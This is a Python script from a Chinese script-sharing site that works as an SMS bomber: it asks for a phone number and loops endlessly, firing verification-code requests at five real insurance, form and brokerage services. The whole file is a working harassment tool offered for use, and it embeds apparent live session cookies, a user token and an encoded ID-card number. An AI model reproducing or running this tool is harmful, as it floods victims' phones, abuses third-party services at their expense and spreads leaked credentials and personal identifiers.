# 当前脚本来自于 http://script.345yun.cn 脚本库下载！
# 脚本库官方QQ群: 429274456
# 脚本库中的所有脚本文件均来自热心网友上传和互联网收集。
# 脚本库仅提供文件上传和下载服务，不提供脚本文件的审核。
# 您在使用脚本库下载的脚本时自行检查判断风险。
# 所涉及到的 账号安全、数据泄露、设备故障、软件违规封禁、财产损失等问题及法律风险，与脚本库无关！均由开发者、上传者、使用者自行承担。

import requests
import base64
import json
import time
from urllib.parse import quote, unquote
import random
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def base64_encode(s):
    return base64.b64encode(s.encode('utf-8')).decode('utf-8')
def send_qixin18_sms(mobile):
    try:
        encoded_mobile = base64_encode(mobile)
        url = "https://cps.qixin18.com/m/apps/cps/bxn1096837/api/mobile/sendSmsCode?md=0.8036556356856903"
        
        headers = {
            "Host": "cps.qixin18.com",
            "Connection": "keep-alive",
            "Content-Length": "209",
            "traceparent": "00-d5056a43b015f07aded289325bbf2233-cfe0be18fc00d80a-01",
            "sec-ch-ua-platform": "\"Android\"",
            "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2049A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380085 MMWEBSDK/20250503 MMWEBID/419 MicroMessenger/8.0.61.2880(0x28003D57) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64",
            "Accept": "application/json, text/plain, */*",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
            "Content-Type": "application/json;charset=UTF-8",
            "sec-ch-ua-mobile": "?1",
            "Origin": "https://cps.qixin18.com",
            "X-Requested-With": "com.tencent.mm",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://cps.qixin18.com/m/apps/cps/bxn1096837/product/insure?encryptInsureNum=cm98HrGWSRoJRojI5Tg6Bg&isFormDetail=1&merak_traceId=0cb083327198781a0a49L9pe4DfciD61",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
            "Cookie": "nodejs_sid=s%3AJe330pDnPvmMafrtsgLGXZubqQg7Plv7.FB9kbFV89DrYQBJkYRb0UkaPNwzEQm5Trgd0yUlseOk; fed-env=production; _qxc_token_=eb81b40d-43f9-4bcf-8b57-bd165da4fad7; hz_guest_key=3x9a97LHUHZ4y3XPekPH_1754097046804_1_1015544_38625430; _bl_uid=j5mjkd0XtbvkC138scUCkhstU8yy; acw_tc=ac11000117543616244402076e006971cba05a01bd4bb140e4df5a1c961c19; merakApiSessionId=ebb083327198781a0976uqPJu53NwsTZ; beidou_jssdk_session_id=1754361629213-2069604-04d431e52fbfe1-30281942; MERAK_DEVICE_ID=54826bc105b8826c0935c7ef9cb76101; MERAK_RECALL_ID=98b083327198781a0b76EQOm7F0i9Itv; MERAK_SESSIONID_ID=0ab083327198781a0b77ccweQE49Inxl; beidoudata2015jssdkcross=%7B%22distinct_id%22%3A%22%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%7D%2C%22session_id%22%3A%22%22%2C%22%24page_visit_id%22%3A%22%22%2C%22%24device_id%22%3A%22%22%2C"
        }        
        data = {
            "cardNumber": "NDIyNDIzMTk3NTA3MjQ2NjE1",
            "mobile": encoded_mobile,
            "cardTypeId": "1",
            "cname": "救赎",
            "productId": 105040,
            "merchantId": 1096837,
            "customerId": 37640245,
            "encryptInsureNum": "cm98HrGWSRoJRojI5Tg6Bg"
        }
        response = requests.post(url, headers=headers, json=data, timeout=10)
        return f"qixin18: {response.status_code} - {response.text[:100]}"        
    except Exception as e:
        return f"qixin18错误: {str(e)}"
def send_mikecrm_sms(mobile):
    try:
        url = "https://support.mikecrm.com/handler/web/form_runtime/handleGetPhoneVerificationCode.php"
        
        headers = {
            "Host": "support.mikecrm.com",
            "Connection": "keep-alive",
            "Content-Length": "109",
            "sec-ch-ua-platform": "\"Android\"",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2049A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380085 MMWEBSDK/20250503 MMWEBID/419 MicroMessenger/8.0.61.2880(0x28003DBE) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "sec-ch-ua-mobile": "?1",
            "Origin": "https://support.mikecrm.com",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://support.mikecrm.com/j7ctI52?_cpv=%7B%22208395996%22%3A%22http%3A%2F%2Fcn.mikecrm.com%2FozURs1%22%7D",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
            "Cookie": "uvi=ERwqUZwjB1eLSXL58Ge9IHiTwzh7omkFegjCa77HG0ErxL9BsVLElvLqYLPmgOoz; mk_seed=84; MK_L_UVD=%7B%2223%22%3A%7B%22n%22%3A%22%u6551%u8D4E%22%7D%2C%2224%22%3A%2218070783632%22%2C%2231%22%3A%22%u6551%u8D4E%u7F51%u7EDC%u5B89%u5168%22%2C%2232%22%3A%22%u56FD%u5B89%22%7D; uvis=ERwqUZwjB1eLSXL58Ge9IHiTwzh7omkFegjCa77HG0ErxL9BsVLElvLqYLPmgOoz"
        }
        form_data = {
            "cvs": {
                "t": "j7ctI52",
                "cp": "208396143",
                "mb": mobile
            }
        }
        encoded_data = quote(json.dumps(form_data))
        data = f"d={encoded_data}"        
        response = requests.post(url, headers=headers, data=data, timeout=10)
        return f"mikecrm: {response.status_code} - {response.text[:100]}"        
    except Exception as e:
        return f"mikecrm错误: {str(e)}"
def send_dxmbaoxian_sms(mobile):
    try:
        url = "https://www.dxmbaoxian.com/juhe/insurface/consultant/sendVerificationCode"
        
        headers = {
            "Host": "www.dxmbaoxian.com",
            "Connection": "keep-alive",
            "Content-Length": "311",
            "sec-ch-ua-platform": "\"Android\"",
            "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2049A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380085 MMWEBSDK/20250503 MMWEBID/419 MicroMessenger/8.0.61.2880(0x28003DBE) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64 miniProgram/wxdde36ae788f0bd5c",
            "Accept": "application/json, text/plain, */*",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
            "Content-Type": "application/json;charset=UTF-8",
            "sec-ch-ua-mobile": "?1",
            "Origin": "https://www.dxmbaoxian.com",
            "X-Requested-With": "com.tencent.mm",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://www.dxmbaoxian.com/s/product?itemId=2000000356&channelId=dxmjr_H5-shouye-dakapian1&sourceChannel=shareMSG_wx-service-xiaochengxu-1005",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
            "Cookie": "MASTATE=5SlGnVKFtSMEHBWE%2BY3emiu0ItEGdAqcf0JXKs4y6TsuDe%2BcqGcB5wk-p%3D%2Bl7ba4p9lS70Gk7Qb8CRRs5TlMG0gBa-X2qghW0ZnSqIYAt1j4pbiPn; MASTATE=5SlGnVKFtSMEHBWE%2BY3emiu0ItEGdAqcf0JXKs4y6TsuDe%2BcqGcB5wk-p%3D%2Bl7ba4p9lS70Gk7Qb8CRRs5TlMG0gBa-X2qghW0ZnSqIYAt1j4pbiPn; DXMBXID=DXMBXID8aad768c-ae20-4086-bbf4-3947cff1c214; LOG_CHANNEL_ID=dxmjr_H5-shouye-dakapian1; LOG_SESSION_ID=a0aa3c64-3e5a-4821-8c77-17473b0739a4-1754372069495; ISEE_DEVICE_ID_V2=2ab07d1621f620b1c62826f788179a94; ISEE_BIZ=11210039Kcue4BD2X_skkAPW48fHg7Q.T; 11210039Kcue4BD2X_skkAPW48fHg7Q=1754372070793; ISEE_COUNT=1102"
        }        
        data = {
            "from": "36",
            "tagId": "",
            "channelId": "dxmjr_H5-shouye-dakapian1",
            "sourceChannel": "shareMSG_wx-service-xiaochengxu-1005",
            "timestamp": int(time.time() * 1000),
            "wxAccessCode": None,
            "sessionId": f"a0aa3c64-3e5a-4821-8c77-17473b0739a4-{int(time.time() * 1000)}",
            "errTimes": 0,
            "syncStokenTime": 0,
            "currentSyncTimes": 0,
            "did": None,
            "phone": mobile
        }        
        response = requests.post(url, headers=headers, json=data, timeout=10)
        return f"dxmbaoxian: {response.status_code} - {response.text[:100]}"        
    except Exception as e:
        return f"dxmbaoxian错误: {str(e)}"
def send_planplus_sms(mobile):
    try:
        url = f"https://blue.planplus.cn/account/api/account/v1/member/sms/sendCode?mobile={mobile}"
        
        headers = {
            "Host": "blue.planplus.cn",
            "Connection": "keep-alive",
            "Content-Length": "0",
            "x-user-token": "TrpusLsAnnNeyJhbGciOiJIUzUxMiJ9.eyJleHAiOjE3NTQ1Mjk3NzAsInRoaWQiOjE3NTQ1Mjk3NzAsInRva2VuIjoie1wiZnJvbVwiOlwicGxhdGZvcm1cIixcIm9wZW5pZFwiOlwib3lLN3UwQXJMVGYybjRNR2oyc0tJYVBTX0hKd1wiLFwidW5pb25pZFwiOlwib0hlQ2NzLUFwSU05N1V2anc1a3prY1E1T3N0b1wifSJ9.o1o4upLSYY2tuiNcrJIG2r-F4DoUcw6YOana759BhzLPLmpRFXDrHKOvNPBDhijD1GKvu7vnc1MyL4BHk0iEhA",
            "content-type": "application/json",
            "charset": "utf-8",
            "Referer": "https://servicewechat.com/wxd4c6c416bdab4315/51/page-frame.html",
            "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2049A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380085 MMWEBSDK/20250503 MMWEBID/419 MicroMessenger/8.0.61.2880(0x28003DBE) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
            "Accept-Encoding": "gzip, deflate, br"
        }        
        response = requests.post(url, headers=headers, timeout=10)
        return f"planplus: {response.status_code} - {response.text[:100]}"        
    except Exception as e:
        return f"planplus错误: {str(e)}"
def send_cindasc_sms(mobile):
    try:
        url = "https://kh.cindasc.com:9096/servlet/json"       
        headers = {
            "Host": "kh.cindasc.com:9096",
            "Connection": "keep-alive",
            "Content-Length": "95",
            "sec-ch-ua-platform": "\"Android\"",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2049A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380143 MMWEBSDK/20250503 MMWEBID/419 MicroMessenger/8.0.61.2880(0x28003D5B) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 miniProgram/wx032693c3c2ecca41",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "sec-ch-ua-mobile": "?1",
            "Origin": "https://kh.cindasc.com:9096",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://kh.cindasc.com:9096/amao/open/views/account/index.html?uid=",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
            "Cookie": "Secure; JSESSIONID=abcTrlliyi37sewFBLMJz"
        }
        timestamp = int(time.time() * 1000)
        data = {
            "mobile_no": mobile,
            "mobileKey": timestamp,
            "funcNo": "501519",
            "op_source": "3",
            "flow_type": "zgkh",
            "ip": "",
            "mac": ""
        }
        form_data = "&".join([f"{k}={v}" for k, v in data.items()])        
        response = requests.post(url, headers=headers, data=form_data, timeout=10, verify=False)
        return f"cindasc: {response.status_code} - {response.text[:100]}"        
    except Exception as e:
        return f"cindasc错误: {str(e)}"
def main():
    mobile = input("手机号: ").strip()    
    if not mobile.isdigit() or len(mobile) != 11:
        print("无效")
        return    
    sms_functions = [
        send_qixin18_sms,
        send_mikecrm_sms,
        send_dxmbaoxian_sms,
        send_planplus_sms,
        send_cindasc_sms
    ]    
    cycle_count = 0    
    try:
        while True:
            cycle_count += 1                  
            for i, sms_func in enumerate(sms_functions, 1):
                try:
                    result = sms_func(mobile)
                    current_time = time.strftime("%H:%M:%S")
                    print(f"嘻嘻 {i}: {result}")
                    time.sleep(0.1)                    
                except Exception as e:
                    current_time = time.strftime("%H:%M:%S")
                    print(f" 嘻嘻平 {i} 错误: {str(e)}")
                    time.sleep(0.1)
            time.sleep(1)            
    except KeyboardInterrupt:
        print("\n\n退.")
    except Exception as e:
        print(f"\n异常: {str(e)}")
if __name__ == "__main__":
    main()

# 当前脚本来自于 http://script.345yun.cn 脚本库下载！
# 脚本库官方QQ群: 429274456
# 脚本库中的所有脚本文件均来自热心网友上传和互联网收集。
# 脚本库仅提供文件上传和下载服务，不提供脚本文件的审核。
# 您在使用脚本库下载的脚本时自行检查判断风险。
# 所涉及到的 账号安全、数据泄露、设备故障、软件违规封禁、财产损失等问题及法律风险，与脚本库无关！均由开发者、上传者、使用者自行承担。